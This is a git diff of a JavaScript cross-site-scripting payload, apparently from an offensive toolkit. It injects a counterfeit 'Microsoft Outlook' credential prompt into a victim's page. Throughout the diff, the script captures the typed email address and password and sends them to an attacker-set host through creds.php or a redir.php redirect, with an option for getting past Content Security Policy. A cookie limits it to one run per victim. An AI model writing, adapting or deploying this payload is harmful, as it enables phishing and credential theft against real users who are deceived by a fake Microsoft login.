@@ -1,8 +1,9 @@
-const scheme = 'http';        // !!! CHANGE THIS !!!
-const attIP = '192.168.5.5';  // !!! CHANGE THIS !!!
-const attPort = '80';         // !!! CHANGE THIS !!!
-const bypassCSP = false;      // !!! CHANGE THIS !!!
-const html = `
+// >>>>> !!! CHANGE THIS !!! >>>>>
+let attWsPhishPath = 'http://192.168.5.5/'; // PUT TRAILING SLASH
+let bypassCSP = false;
+let runOnce = true;
+// <<<<< <<<<< <<<<< <<<<< <<<<<
+const phishHtml = `
 <style>
   .button73 {
     width: 190px;
@@ -66,41 +67,49 @@ const html = `
   <p style="margin-left: 12px; margin-top: 14px; font-size: 18px; user-select: none;">Microsoft Outlook</p>
   <p style="margin-left: 12px; margin-top: 18px; font-size: 12px; user-select: none;">Connecting to outlook.office365.com</p>
   <form onsubmit="return false;">
-    <p style="margin-left: 12px; margin-top: 16px;"><input type="text" name="username" id="username" class="textbox73" placeholder="Email address" size="32" autofocus></p>
-    <p style="margin-left: 12px; margin-top: 10px;"><input type="password" name="password" id="password" class="textbox73" placeholder="Password" size="32"></p>
+    <p style="margin-left: 12px; margin-top: 16px;"><input class="textbox73" type="text" name="username" id="username" placeholder="Email address" size="32" autofocus></p>
+    <p style="margin-left: 12px; margin-top: 10px;"><input class="textbox73" type="password" name="password" id="password" placeholder="Password" size="32"></p>
     <p style="margin-left: 8px; margin-top: 14px; user-select: none;"><label class="checkbox73"><input type="checkbox" name="checkbox" id="checkbox"><span class="checkmark73"></span></label><label style="margin-left: 6px; font-size: 12px; vertical-align: super;">Remember my credentials</label></p>
-    <p style="margin-left: 12px; margin-top: 30px;"><input type="button" name="okbutton" id="okbutton" class="button73" value="OK" onclick="submitLoginForm()"><input type="button" class="button73" value="Cancel" onclick="submitLoginForm()"></p>
+    <p style="margin-left: 12px; margin-top: 30px;"><input class="button73" type="button" name="okbutton" id="okbutton" value="OK" onclick="submitLoginForm()"><input class="button73" type="button" value="Cancel" onclick="submitLoginForm()"></p>
   </form>
 </div> `;
 async function getURL(url) {
   return await fetch(url, {mode: "no-cors"});
 }
 async function submitLoginForm() {
-  const redirectURL = window.location.protocol + '//' + window.location.hostname + window.location.pathname;
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-  // CASE: CSP BYPASS REQUIRED
+  let username = document.getElementById('username').value;
+  let password = document.getElementById('password').value;
+  let redirURL = window.location.protocol + '//' + window.location.hostname + window.location.pathname;
+  // [CASE] CSP BYPASS REQUIRED
   if (bypassCSP) {
-    document.location = (scheme.concat('://').concat(attIP).concat(':').concat(attPort).concat('/redir.php?user=').concat(username).concat('&pass=').concat(password).concat('&redir=').concat(redirectURL));
+    document.location = attWsPhishPath + 'redir.php?user=' + username + '&pass=' + password + '&redir=' + redirURL;
   }
-  // CASE: CSP BYPASS NOT REQUIRED
+  // [CASE] CSP BYPASS NOT REQUIRED
   else {
-    const url = (scheme.concat('://').concat(attIP).concat(':').concat(attPort).concat('/creds.php?user=').concat(username).concat('&pass=').concat(password));
-    await this.getURL(url);
-    window.open(redirectURL, '_self');
+    await this.getURL(attWsPhishPath + 'creds.php?user=' + username + '&pass=' + password);
+    window.open(redirURL, '_self');
   }
 }
-let expire = new Date();
-expire.setFullYear(expire.getFullYear() + 1);
-let cookie = 'runonce=true; path=/; expires=' + expire.toUTCString();
-const div = document.createElement('div');
-if (document.cookie.indexOf('runonce=') < 0) {
-  div.innerHTML = html;
-  document.getElementsByTagName('body')[0].appendChild(div);
-  document.cookie = cookie;
+function execPayld() {
+  let phishDiv = document.createElement('div');
+  phishDiv.innerHTML = phishHtml;
+  document.getElementsByTagName('body')[0].appendChild(phishDiv);
+  document.getElementById('password').addEventListener('keyup', event => {
+    if(event.key !== 'Enter') return;
+    document.getElementById('okbutton').click();
+    event.preventDefault();
+  });
 }
-document.getElementById('password').addEventListener('keyup', event => {
-  if(event.key !== 'Enter') return;
-  document.getElementById('okbutton').click();
-  event.preventDefault();
-});
+// [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
+if ((runOnce) && !(/^(.*;)?\s*winPhi\s*=\s*[^;]/.test(document.cookie))) {
+  let cookExp = new Date();
+  cookExp.setFullYear(cookExp.getFullYear() + 1);
+  let cook = 'winPhi=true; path=/; expires=' + cookExp.toUTCString();
+  document.cookie = cook;
+  execPayld();
+}
+// [CASE] RUN (PAYLOAD) ONCE NOT ENABLED => EXECUTE PAYLOAD
+if (!runOnce) {
+  execPayld();
+}
+// EoF
